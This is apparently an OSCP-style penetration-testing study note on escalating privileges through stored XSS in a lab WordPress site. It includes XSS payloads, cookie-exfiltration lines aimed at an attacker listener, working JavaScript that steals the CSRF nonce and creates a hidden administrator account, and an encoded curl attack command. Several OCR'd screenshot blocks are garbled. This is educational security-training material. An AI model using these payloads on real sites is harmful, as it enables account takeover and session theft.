---
tags:
  - phase/exploitation
  - web
  - xss
---

# Privilege Escalation via XSS

> [!tip] Quick Reference — XSS
> | Type | Payload |
> |------|---------|
> | Basic test | `<script>alert(1)</script>` |
> | Image onerror | `<img src=x onerror=alert(1)>` |
> | SVG | `<svg onload=alert(1)>` |
> | Cookie steal | `<script>document.location='http://<LHOST>/?c='+document.cookie</script>` |
> | Attribute inject | `" onmouseover="alert(1)` |
> | Filter bypass | `<ScRiPt>alert(1)</ScRiPt>` |

## Decision Tree

```
User input reflected in page?
├── Test basic: <script>alert(1)</script>
│   ├── Popup appears → Stored or Reflected XSS
│   └── No popup → check page source for output
│       ├── Output in attribute → " onmouseover="alert(1)
│       ├── Output in JS context → ';alert(1);//
│       └── Filtered → try alternatives (img, svg, uppercase, encoding)
│
├── Stored XSS (persists for other users)?
│   └── Higher impact — can target admin sessions
│       ├── Cookie theft (if no HttpOnly)
│       │   └── <script>fetch('http://<LHOST>/?c='+btoa(document.cookie))</script>
│       └── Admin action via CSRF + XSS
│           └── Craft JS to perform action as admin (create user, change password)
│
└── Reflected XSS?
    └── Needs victim to click URL — less useful for OSCP unless specifically required
```

## Visual Flow

```mermaid
flowchart TD
    A[Stored XSS runs as the admin] --> B{Can we steal the session cookie?}
    B -->|No - cookies are HttpOnly| C[JavaScript cannot read the cookie<br/>need a new angle]
    B -->|Yes - no HttpOnly| D[Exfiltrate cookie to our listener]
    C --> E[Payload 1: fetch /wp-admin/user-new.php<br/>and scrape the CSRF nonce]
    E --> F[Payload 2: POST create-user request<br/>with the nonce and our admin details]
    F --> G[Minify the JS at jscompress.com]
    G --> H[Encode to char codes<br/>eval plus String.fromCharCode]
    H --> I[Send via curl in the User-Agent through Burp]
    I --> J[Admin loads Visitors plugin - payload fires]
    J --> K[New attacker admin account created]
```

> [!success] What success looks like
> After the admin loads the Visitors plugin, the injected JS silently runs in their session: it grabs the nonce, POSTs a create-user request, and a brand-new **attacker** account with the `administrator` role appears under Users. You now have full admin access.

> [!danger] Common errors
> - Cookie-theft payload returns nothing → the WordPress session cookies have the `HttpOnly` flag, so JavaScript cannot read them; pivot to the create-admin-user approach instead.
> - Create-user request rejected → you are missing or using a stale **nonce** (the anti-CSRF token); fetch a fresh one from `/wp-admin/user-new.php` in the same payload before POSTing.
> - Payload breaks when sent → unencoded special characters mangle the request; minify then encode with `String.fromCharCode` so no bad characters interfere. See [[🔣 Encoding Reference]].
> - The User-Agent shows blank in the Visitors table → expected, because the value is wrapped in `<script>` tags and executed rather than displayed.
> Full list: [[⚠️ Common Errors & Troubleshooting]]

> [!tip] Beginner note
> A **nonce** is a one-time random token WordPress adds to forms to stop CSRF — an outside attacker can't guess it. But our JavaScript is already running *inside* the admin's authenticated page, so it can simply read the valid nonce off the page and reuse it, which is why the anti-CSRF protection doesn't stop a stored-XSS attack.

## Resources
- [HackTricks — XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [XSS Hunter](https://xsshunter.trufflesecurity.com) — blind XSS callbacks


Since we are now capable of storing JavaScript code inside the target WordPress application and having it executed by the admin user when loading the page, we're ready to get more creative and explore different avenues for obtaining administrative privileges.

We could leverage our XSS to steal cookies and session information if the application uses an insecure session management configuration. If we can steal an authenticated user's cookie, we could masquerade as that user within the target web site.

Websites use cookies to track state and information about users. Cookies can be set with several optional flags, including two that are particularly interesting to us as penetration testers: Secure and HttpOnly.

The Secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.

The HttpOnly flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

Let's verify the nature of WordPress' session cookies by first logging in as the admin user.

Next, we can open the Web Developer Tools, navigate to the Storage tab, then click on
[http://offsecwp](http://offsecwp)
under the Cookies menu on the left.



We notice that our browser has stored six different cookies, but only four are session cookies. Of these four cookies, if we exclude the negligible wordpress_test_cookie, all support the HttpOnly feature.

Since all the session cookies can be sent only via HTTP, unfortunately, they also cannot be retrieved via JavaScript through our attack vector. We'll need to find a new angle.

When the admin loads the Visitors plugin dashboards that contains the injected JavaScript, it executes whatever we provided as a payload, be it an alert pop-up banner or a more complex JavaScript function.

For instance, we could craft a JavaScript function that adds another WordPress administrative account, so that once the real administrator executes our injected code, the function will execute behind the scenes.

To succeed with our attack angle, we need to cover another web application attack class.

To develop this attack, we'll build a similar scenario as depicted by Shift8. First, we'll create a JS function that fetches the WordPress admin nonce.
[https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/)
[https://developer.wordpress.org/reference/functions/wp_nonce_field/](https://developer.wordpress.org/reference/functions/wp_nonce_field/)
The nonce is a server-generated token that is included in each HTTP request to add randomness and prevent Cross-Site-Request-Forgery (CSRF) attacks.

A CSRF attack occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalf of the user.

The malicious link could be disguised by an apparently harmless description, often luring the victim to click on it.



In the above example, the URL link is pointing to a Fake Crypto Bank website API, which performs a bitcoin transfer to the attacker account. If this link was embedded into the HTML code of an email, the user would be only able to see the link description, but not the actual HTTP resource it is pointing to. This attack would be successful if the user is already logged in with a valid session on the same website.

In our case, by including and checking the pseudo-random nonce, WordPress prevents this kind of attack, since an attacker could not have prior knowledge of the token. However, as we'll soon explain, the nonce won't be an obstacle for the stored XSS vulnerability we discovered in the plugin.

As mentioned, to perform any administrative action, we need to first gather the nonce. We can accomplish this using the following JavaScript function:





This function performs a new HTTP request towards the /wp-admin/user-new.php URL and saves the nonce value found in the HTTP response based on the regular expression. The regex pattern matches any alphanumeric value contained between the string /ser" value=" and double quotes.

Now that we've dynamically retrieved the nonce, we can craft the main function responsible for creating the new admin user.




Highlighted in this function is the new backdoored admin account, just after the nonce we obtained previously. If our attack succeeds, we'll be able to gain administrative access to the entire WordPress installation.

To ensure that our JavaScript payload will be handled correctly by Burp and the target application, we need to first minify it, then encode it.

To minify our attack code into a one-liner, we can navigate to JS Compress.
[https://jscompress.com/](https://jscompress.com/)
After clicking Compress JavaScript, we’ll copy and locally save the minified output.

As a final step, we’ll encode the minified JavaScript code, so any bad characters won't interfere with sending the payload.

We can do this using the following function:







The encode_to_javascript function will parse the minified JS string parameter and convert each character into the corresponding UTF-16 integer code using the charCodeAt method.
[https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charCodeAt](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charCodeAt)
Let's run the function from the browser's console.



We are going to decode and execute the encoded string by first decoding the string with the fromCharCode method, then running it via the eval() method. Once we have copied the encoded string, we can insert it with the following curl command and launch the attack:





Before running the curl attack command, let's start Burp and leave Intercept on.

We instructed curl to send a specially-crafted HTTP request with a User-Agent header containing our malicious payload, then forward it to our Burp instance so we can inspect it further.

After running the curl command, we can inspect the request in Burp.



Everything seems correct, so let's forward the request by clicking Forward, then disabling Intercept.

At this point, our XSS exploit should have been stored in the WordPress database. We only need to simulate execution by logging in to the OffSec WP instance as admin, then clicking on the Visitors plugin dashboard on the bottom left.



We notice that only one entry is present, and apparently no User-Agent has been recorded. This is because the User-Agent field contained our attack embedded into "<script>" tags, so the browser cannot render any string from it.

By loading the plugin statistics, we should have executed the malicious script, so let's verify if our attack succeeded by clicking on the Users menu on the left pane.



Excellent! This XSS flaw allowed us to escalate privileges from a standard user to an administrator by leveraging a crafted HTTP request.

We could now advance our attack and gain access to the underlying host by crafting a custom WordPress plugin with an embedded web shell. We'll cover web shells more in-depth in another Module.

> [!note]- Screenshot
> ```
> Figure 29: Inspecting WordPress Cookies
> ```


> [!note]- Screenshot
> ```
> <a href="http: //fakecryptobank. com/send_btc?account=ATTACKER&amount=108000"">Check out
> ‘these awesome cat memes! </a>
> Listing 26 - CSRF example attack
> ```


> [!note]- Screenshot
> ```
> var ajaxRequest = new XMLHttpRequest();
> var requestURL = “/wp-admin/user-new.php™;
> var nonceRegex = /ser” value="([~"]*?)"/g3
> ajaxRequest .open("GET", requestURL, false);
> ajaxRequest..send();
> var nonceMatch = nonceRegex.exec(ajaxRequest .responseText) ;
> var nonce = nonceMatch[1];
> Listing 27 - Gathering WordPress Nonce
> ```


```sh
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```


> [!note]- Screenshot
> ```
> var params = “action=createuser& wpnonce_create-
> user="snonce+"&user_login=attacker&email-attacker@offsec. com&pass1-attackerpass&pass2=a
> ttackerpass&role-administrator”;
> ajaxRequest = new XMLHttpRequest();
> ajaxRequest .open("POST", requestURL, true);
> ajaxRequest .setRequestHeader("Content-Type”, “application/x-www-form-urlencoded”) ;
> ajaxRequest .send(params) ;
> 
> Listing 28 - Creating a New WordPress Administrator Account
> ```


```sh
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```


> [!note]- Screenshot
> ```
> I ISCompress-The lavas | + - ox
> 
> « ca ‘© B hitps:ljscompress.com a 2 OF
> BIKali Linux AX KaliTools Kali Forums  KaliDocs GE NetHunter ML OffensiveSecurty A MSFU # Exploit-0B + GHOB
> 
> Copy & Paste avaScriptCode __Uploadavascript Files __Output oO :
> 
> var aimsBonuest ~ new ittoReouest:
> 
> Var KRHUSSRURL ~ “/ypAGRLn/ User new. ag":
> 
> var anseleger = /sar values" ((-"T"7)"79
> 
> ‘laatuussd open “CET, reassstU, 12158):
> 
> Aipseeniags. send);
> 
> war nasslaich ~ oonseBeges.exec(aiaxtanusss. cesmansslass)
> 
> Yar nonce = pancebakbttT:
> 
> ‘ar parans = factionceresteusers. wpnonce create-user="‘noncer“Guser loginattackerSenailaattackerGoffsec. conspasslaattackerpassé,
> 
> passDeattackerpassGroleradninist®atar"s
> 
> Blaeisauest = new UMCSaReauasg 0:
> 
> AtaxBeausat.open(°POSt", cequeatURL, rue);
> 
> Alavieaueat setRenssstuéader "Content-Type", appLication/xmccfacauclescadsd”;
> 
> Biawisausat. seno(parans)
> 
> Compress javascript
> 
> Figure 30: Minifying the XSS attack code
> ```


> [!note]- Screenshot
> ```
> function encode_to_javascript(string) {
> var input = string
> var output = *";
> for(pos = @; pos < input.length; pos++) {
> output += input.charCodeat(pos);
> if(pos != (input.length - 1)) {
> output += 7,5.
> +
> +
> return output;
> 3
> let encoded = encode_to_javascript(‘insert_minified_javascript’)
> console. 1og(encoded)
> Listing 29 - JS Encoding JS Function
> ```


```sh
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```


> [!note]- Screenshot
> ```
> BBKol Lowe AUKaL Tools AEKallForums RP KaliDocs GUNetHunter Offensive Securly AMSFU # Explot-DB 4 GHOB
> CRC ispecar ECan D Oebager th Nework (Sole tstor OV Petomonce Oi Menoy Stage Hf Acessity @ Conbestor 2G] om X
> a as Wang Lge big) SS Rags |
> 2 ~fancon ene in necisttrio)
> 
> {Bribes 07 pos < Srout-enaths pose ¢
> 
> :
> ,
> ie cue = ence 0 Jey var agetenstne RAR RESTOR OIE gg” vate
> >I q
> Figure 31: Encoding the Minified JS with the Browser Console
> ```


> [!note]- Screenshot
> ```
> kali@kali:~$ curl -i http://offsecwp --user-agent “
> <script>eval (String. fromCharCode(118, 97 ,114,32,97,106,97,120,82,101,113,117,101,115,116
> 61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,11
> 7,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110
> 101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,3
> 4,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101
> 4113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,11
> 6,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,4
> 0,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,
> 103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,11
> 5,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,
> 97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,1
> 01,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101
> 245,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103
> 105,110, 61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,
> 101,114, 64,111,102, 102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,9
> 9,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,9
> 7,115,115,38,114,111,108,101,61,97,100, 109,105,110, 105,115,116,114,97,116,111,114,34,59
> 40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119, 32,88,77,76,72,116,116,112,
> 82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,11
> 7,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,1
> 01,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,11
> 6,45,84, 121,112,101, 34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119
> 4119,45,102,111,114,109,45,117,114,108,101,110,99,111, 100,101,100, 34,41,44,97,106,97,12
> @,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))
> </script>” --proxy 127.0.0.1:8080
> 
> Listing 30 - Launching the Final XSS Attack through Curl
> ```


```sh
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```


> [!note]- Screenshot
> ```
> a Burp Suite Community
> 
> Burp Project Intruder Repeater Window — Help
> 
> Dashboord Target _Fiosy intruder Repeater —“Sequencer_—Decoder_—«Comparer——Logger_—‘Extender_—_~Project options
> 
> Intercept __HTTPhistory _WebSocetshistory Options
> 
> 2 Requesttohtp/loffseowp:80 [1821685016
> Forward Drop ‘Acton penBronser
> 
> Hex we
> 
> cet / HITP/LA
> Host: offsecwp
> sscript>eval ( String. fromCharCode(118,$7,114, 32, 97,106, 97,120, 82,101,123,117,101, 125,116, 61,110, 101,119,352, 88, 77,76
> 72,116, 116,112, €2,101,113,117,101,115,116,44,114,101,113,117, 101,115,116, 85, &2,76,61,34, 47,119,112, 45,97,100,109,10
> 5,110, 47,117,115, 101,114, 45,110, 101,119, 46,112, 104,112, 34,44, 110,111,110, 99, 101, 62,101, 103,101,120, 61, 47,115, 101,12
> 4,34, 32,118, 97, 108,117,101, 61,36, 40,91, 94, 34, 93, 42,63, 41, 34, 47,103, 59,97,106, 97, 120,62,101,113,117, 101,115,116, 46,1
> 11,112,101, 110, 40, 34, 71,69, 64, 36, 44,114,101 113,117,101, 125, 116,85,82,76,44, 33,49, 41, 46,97,105, 97,120,82,101,113,12
> 7,101,115, 116, 46,115, 101, 110, 100,40, 41,59,118, 97,114, 32,110, 111,110,99,101, 77, 97,116, 99, 104,61, 110,111,110, 99, 101.8
> 2/101, 163, 101,120, 46, 101, 120, 101,99, 40, 97, 105, 97,120.62, 101, 113,127,101, 115, 116, 45,114, 101,115,112, 111,110, 115,101,
> 4,161,126, 116, 41, 48,116, 111,110,99, 161,61,110, 111,110, 98, 101,77, 97,116, 9, 194, 91, 49,93, 44, 112,97, 114,97, 103,115, 61
> +34,97,99, 116,105,111, 110,61,99,114,101, 97,116, 101,117, 115,161, 114, 38,95, 119,112, 110,111,110, 93,101, 95,98,114, 101.9,
> 7,116,101, 45,117,115, 101,114, 61,34, 43,110,111, 110, 99,101, 43, 4, 38,127,125, 101,114, 95,108,111, 103, 105,110, 61, 57,116,
> 116,97, 39,107, 101,114, 36, 101, 109, 97,105,108, 61, 97,126,116,57,99,107,101,114, 64,111, 102,102,115, 101,99, 46,99, 111,109
> 38, 112, 57,115,115, 49, 61,97, 116, 116,97,99,107, 101,114, 112,97, 115,125, 38,112,97, 115, 115,50, 61,57,116,116,97,$9,107.2
> 61,114,112, 97,115,115, 38, 114,111, 108, 101, 61,97, 100,109,105, 110, 105,115,116,114, 97, 116,111,114, 34,59, 40,97,106, 97,12
> 082,101,113, 117, 101,115,116, 61,110, 101,119, 32, 88,77, 76, 72,116,116, 112,82, 101,113,117, 101, 115,116, 41, 46,111,112, 101
> 1110, 40, 34, 80,79,.83,64,34, 44,114,101,113,117,101, 125, 116,85, 82,76, 44,33, 48, 4,44, 97, 106,97, 120,62. 101,113,117,101.2
> 15,116, a6, 115, 101,116, 2,101, 113,117,101, 115,116.72, 101, 7,109, 101,114, 40, 34,67, 111,110,116, 101,110,116, 45,64, 121.1
> 12,161, 34,44, 3, 97,112,112, 168, 105,99,97,116, 105,111,110, 47,129, 45, 119,119,119, 45, 102,111,114, 108, 45,117,114, 108, 10
> 1,110,$9, 111,100,101, 100, 34,41, 44, 97, 106, 57,120, 82, 101,113,117, 102,215,116, 46,125, 101, 110, 100, 49, 112,97, 114, 7, 108,
> 115,41,59))</script>
> 
> 4 Accept! 17"
> 
> 5 Connection: close
> 
> Figure 32: Inspecting the Attack in Burp
> ```


> [!note]- Screenshot
> ```
> Star Offsec — WordPress x - 3 x
> < > @ © 8 offsecwp we @e=
> Kali Linux WR KaliTools HN Kali Forums KI KaliDocs WNetHunter Ik OffensiveSecurty ML MSFU # Exploi-D8. 4 GHDB
> D) Moms O6 Po + na ows. ain Il
> © Dathbowrd tooues
> A Posts
> 2) Media Visitors
> © Poe “This theme suggests the flowing plug °
> comments f
> # popearance
> 
> start
> K Plugins @
> 
> Today (pal t3, 2022 v
> 
> Past Users Visits
> BF Setting ' |
> 
> * Date and Time ur °
> 
> 1 pri’ 3,202959 am '
> start
> )
> 
> Figure 33: Loading Visitors Statistics
> ```


> [!note]- Screenshot
> ```
> Users sec —WordPress - ax
> « > @ © B offsecwpfwp-adminfusers php Ow 26
> BIKaliLinux WKaiToots ER KaliForums E) KaliDocs BENetHunter Offensive Security LMSFU «A Expoit-08. # GHOB
> DV A ofc Oo Po tne way ain
>  Deshboard | ‘Meterereer . .
> F Post
> 9) Media Users
> HF Poses ‘Thistheme suggets the fllowing posi °
> F comment f
> . i) )
> fe Plugin
> * Butk ato ¥ Change role t ¥ 2ite
> Ntusers
> Settings
> Name Role Posts
> & Visto
> Bulk actions v Change roleto v =
> © cot
> Figure 34: Confirming that our Attack Succeeded
> ```

---
%% graph-links %%
## Related
- [[Basic XSS]]
- [[Identifying XSS Vulnerabilities]]

> [!info] Navigation
> Section: [[Web Applications/Cross-Site Scripting/_index|Cross-Site Scripting]] · Home: [[🏠 Home]]

